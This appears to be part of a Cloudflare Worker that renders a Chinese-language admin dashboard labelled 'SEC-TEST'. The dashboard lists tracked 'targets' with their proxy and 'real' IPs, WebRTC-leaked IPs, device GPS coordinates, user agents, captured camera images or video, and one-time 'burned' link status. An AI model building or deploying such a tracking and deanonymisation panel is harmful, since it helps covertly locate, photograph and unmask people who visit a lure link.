        mediaBlock = '<span class="px-2 py-1 bg-red-100 text-red-600 rounded text-xs font-bold">拒绝权限</span>';
      } else if (r.media_url) {
        if (r.media_type === 'video') {
           mediaBlock = '<a href="' + r.media_url + '" target="_blank" class="text-indigo-500 hover:underline text-xs"><i class="fa-solid fa-film"></i> 播放</a>';
        } else {
           mediaBlock = '<a href="' + r.media_url + '" target="_blank"><img src="' + r.media_url + '" class="h-16 w-auto rounded hover:scale-150 transition-transform origin-left object-cover cursor-pointer"></a>';
        }
      }
    }

    let deviceGeoBlock = '<span class="text-gray-400 text-xs">-</span>';
    if (r.device_geo) {
       try {
           const dGeo = JSON.parse(r.device_geo);
           if (dGeo.denied) {
               deviceGeoBlock = '<span class="text-red-500 text-xs">拒绝定位</span>';
           } else {
               deviceGeoBlock = '<div class="text-xs text-emerald-600 font-mono">' + dGeo.lng + ', ' + dGeo.lat + '</div>';
           }
       } catch(e) {}
    }

    let webrtcBlock = '<span class="text-gray-400 text-xs">-</span>';
    if (r.webrtc_leak) {
       try {
           const webrtc = JSON.parse(r.webrtc_leak);
           const results = webrtc.results || [];
           if (results.length > 0) {
               const leaked = results.filter(res => res.ip && res.ip !== '');
               if (leaked.length > 0) {
                   webrtcBlock = '<div class="text-xs text-red-600 font-mono font-bold">' + leaked[0].ip + '<br><span class="text-gray-500 font-normal">(' + leaked[0].provider + ')</span></div>';
               } else {
                   webrtcBlock = '<span class="text-gray-400 text-xs">未泄露</span>';
               }
           }
       } catch(e) {}
    }

    let uaBlock = '<span class="text-gray-400 text-xs cursor-pointer hover:text-indigo-600" onclick="showRawUA(this)">查看</span>';
    if (r.ua_parsed) {
       try {
           const uaParsed = JSON.parse(r.ua_parsed);
           uaBlock = '<div class="text-xs text-gray-700">' + uaParsed.browser + ' / ' + uaParsed.os + '</div><div class="text-[10px] text-gray-500 cursor-pointer hover:text-indigo-600 truncate max-w-xs" title="' + r.ua + '" onclick="showRawUA(this)">原文UA</div>';
       } catch(e) {}
    }

    const burnedBadge = r.is_burned ? '<span class="ml-1 px-2 py-1 rounded text-[10px] font-bold bg-orange-100 text-orange-600"><i class="fa-solid fa-fire mr-1"></i>已焚毁</span>' : '';
    const dateStr = new Date(r.created_at).toLocaleString();

    const accessIp = r.real_ip && r.real_ip !== r.ip ? r.real_ip : '未检测';
    const cfIp = r.ip || '未知';

    timelineHtml += '<div class="p-4 border-l-4 border-indigo-300 bg-white mb-3 rounded-r-lg hover:shadow-md transition-shadow">' +
                  '<div class="flex items-start justify-between mb-2">' +
                    '<div>' +
                      '<span class="inline-block px-3 py-1 rounded-full text-xs font-bold ' + eventColor + '"><i class="fa-solid ' + eventIcon + ' mr-1"></i>' + eventTitle + '</span>' +
                      burnedBadge +
                    '</div>' +
                    '<div class="text-xs text-gray-400">' + dateStr + '</div>' +
                  '</div>' +
                  '<div class="grid grid-cols-2 md:grid-cols-4 gap-4 mt-3 text-xs">' +
                    '<div><span class="font-semibold text-gray-600">ID:</span><div class="text-gray-800 font-mono">' + r.target_id + '</div></div>' +
                    '<div><span class="font-semibold text-gray-600">CF IP:</span><div class="text-gray-800 font-mono">' + cfIp + '</div></div>' +
                    '<div><span class="font-semibold text-gray-600">真实IP:</span><div class="text-red-600 font-mono font-bold">' + accessIp + '</div></div>' +
                    '<div><span class="font-semibold text-gray-600">位置:</span><div class="text-gray-700">' + geoStr + '</div></div>' +
                  '</div>' +
                  '<div class="grid grid-cols-2 md:grid-cols-4 gap-4 mt-2 text-xs">' +
                    '<div><span class="font-semibold text-gray-600">GPS:</span>' + deviceGeoBlock + '</div>' +
                    '<div><span class="font-semibold text-gray-600">WebRTC:</span>' + webrtcBlock + '</div>' +
                    '<div><span class="font-semibold text-gray-600">设备:</span>' + uaBlock + '</div>' +
                    '<div><span class="font-semibold text-gray-600">媒体:</span>' + mediaBlock + '</div>' +
                  '</div>' +
                  '<button onclick="deleteRecord(' + r.id + ')" class="mt-2 px-2 py-1 text-xs bg-red-100 hover:bg-red-200 text-red-600 rounded transition-colors"><i class="fa-solid fa-trash mr-1"></i>删除</button>' +
                '</div>';
  }

  const html = `
  <!DOCTYPE html>
  <html lang="zh">
  <head>
    <meta charset="UTF-8">
    <title>SEC-TEST 超级控制台</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
      .custom-scrollbar::-webkit-scrollbar { width: 8px; }
      .custom-scrollbar::-webkit-scrollbar-track { background: #f1f5f9; }
      .custom-scrollbar::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 10px; }
      .custom-scrollbar::-webkit-scrollbar-thumb:hover { background: #94a3b8; }
    </style>
  </head>
  <body class="bg-gray-50 p-6 font-sans">
    <div class="max-w-6xl mx-auto">
      <div class="flex justify-between items-center mb-6 bg-white p-6 rounded-2xl shadow-sm border border-gray-200">
        <h1 class="text-2xl font-bold text-gray-800"><i class="fa-solid fa-server text-indigo-600 mr-2"></i>全局事件审计日志</h1>
        <div class="flex gap-2">
          <button onclick="if(confirm('确定要清空所有数据吗？此操作不可撤销！')) clearAllData()" class="px-4 py-2 text-sm bg-red-600 hover:bg-red-700 text-white rounded-lg transition-colors">
            <i class="fa-solid fa-trash-alt mr-1"></i>清空数据库
          </button>
        </div>
      </div>

      <div class="bg-white rounded-2xl shadow-sm border border-gray-200 p-6 max-h-[calc(100vh-200px)] overflow-y-auto custom-scrollbar">
        ${timelineHtml || '<div class="text-center text-gray-400 py-12">暂无记录</div>'}
      </div>
    </div>

    <script>
      async function deleteRecord(id) {
        if(!confirm('确定要删除这条记录吗？')) return;
        try {
          await fetch('/admin/delete', {
            method: 'POST',
            body: JSON.stringify({ id: id }),
            headers: { 'Content-Type': 'application/json' }
          });
          location.reload();
        } catch(e) {
          alert('删除失败: ' + e.message);
        }
      }

      async function clearAllData() {
        try {
          await fetch('/admin/clear', {
            method: 'POST',
            body: JSON.stringify({}),
            headers: { 'Content-Type': 'application/json' }
          });
          location.reload();
        } catch(e) {
          alert('清空失败: ' + e.message);
        }
      }

      function showRawUA(elem) {
        const ua = elem.title || elem.parentElement.parentElement.querySelector('[title]').title;
        alert('完整UA：\\n' + ua);
      }
    </script>
  </body>
  </html>`;
  
  return new Response(html, { headers: { "Content-Type": "text/html" } });
}